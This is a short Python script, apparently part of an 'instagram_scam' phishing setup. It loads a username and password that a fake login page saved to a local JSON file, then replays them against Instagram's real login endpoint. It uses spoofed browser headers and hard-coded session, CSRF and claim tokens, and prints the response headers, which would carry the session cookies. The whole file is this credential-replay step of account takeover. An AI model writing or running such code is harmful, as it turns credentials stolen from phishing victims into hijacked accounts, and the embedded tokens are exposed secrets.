import requests
import json
import datetime

with open('C:/xampp/htdocs/instagram_scam/php/login_tmp.json','r') as file:
   login = json.load(file)

username = login['username']
password = login['password']
time = str(int(datetime.datetime.now().timestamp()))

headers = {
    'authority': 'www.instagram.com',
    'accept': '*/*',
    'accept-language': 'es-ES,es;q=0.9',
    'content-type': 'application/x-www-form-urlencoded',
    'cookie': 'sessionid="63543673532%3Ao1rQgExyR55qyh%3A9%3AAYdolq0alocfYXcyu1_dkGDcyZ-MxEWZuW-tLqExjA"',
    'dpr': '1',
    'origin': 'https://www.instagram.com',
    'referer': 'https://www.instagram.com/',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-full-version-list': '"Chromium";v="116.0.5845.188", "Not)A;Brand";v="24.0.0.0", "Google Chrome";v="116.0.5845.188"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-model': '""',
    'sec-ch-ua-platform': '"Windows"',
    'sec-ch-ua-platform-version': '"10.0.0"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
    'viewport-width': '553',
    'x-asbd-id': '129477',
    'x-csrftoken': 'ndrHP6dJJZGjtTar5jCJY89ldM7m3pNw',
    'x-ig-app-id': '936619743392459',
    'x-ig-www-claim': 'hmac.AR2nVHEyniKL_iDQUTx4aUwv2jwEhviQe-1InCaP6w0wZxWE',
    'x-instagram-ajax': '1008688753',
    'x-requested-with': 'XMLHttpRequest',
}

data = {
    'enc_password': '#PWD_INSTAGRAM_BROWSER:0:'+time+':'+ password,
    'optIntoOneTap': 'false',
    'queryParams': '{}',
    'trustedDeviceRecords': '{}',
    'username': username,

}

response = requests.post('https://www.instagram.com/accounts/login/ajax/', headers=headers, data=data)
res = response.headers
res = json.dumps(dict(res))
print (response.text)
print(res)

#print (json.dumps(dict(response.headers)))